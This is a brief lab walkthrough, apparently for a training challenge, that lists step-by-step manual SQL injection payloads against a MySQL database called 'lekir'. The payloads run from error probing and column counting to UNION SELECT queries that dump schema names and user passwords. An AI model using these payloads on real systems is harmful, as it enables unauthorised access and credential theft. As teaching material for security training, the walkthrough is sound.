Low Manual SQL Injection Payload Example - mysql
@ Challenge : find some hidden tables and data on the database.

-- Tests for SQL injection by injecting a single quote to provoke error messages.
1' 

-- Attempts a boolean-based SQL injection by injecting a condition that always evaluates to true, showing all user on the current table.
1' OR '1'='1

-- Searching for columns numbers, will produce error at 4, meaning query targets three columns
1' order by 1# -- Order by the first column
1' order by 2# -- Order by the second column
1' order by 3# -- Order by the third column
1' order by 4# -- Error indicates the query targets at least three columns

OR

1' order by 1,2,3# -- Order by the 1,2,3 column. No error
1' order by 1,2,3,4# -- Error indicates the query targets at least three columns

-- Now we know it using only 3 columns, searching for usable reflection point. We can see 1, 2, 3 are reflected on the page
' UNION SELECT 1,2,3 #

-- Getting current database name, database version and current user
' UNION SELECT database(), version(), current_user() #

-- Tries a union-based SQL injection to extract table names from the database schema using database 'lekir'.
'UNION SELECT table_name, NULL, NULL FROM information_schema.tables WHERE table_schema='lekir'#

-- Fetches column names for a specific table 'user' from the database name 'lekir'.
'UNION SELECT column_name, NULL, NULL FROM information_schema.columns WHERE table_name= 'user' AND table_schema='lekir' #

-- Attempts to retrieve sensitive data like user IDs, usernames, and passwords from the lekir database and user table.
'UNION SELECT user_id, user_name, user_password FROM lekir.user #
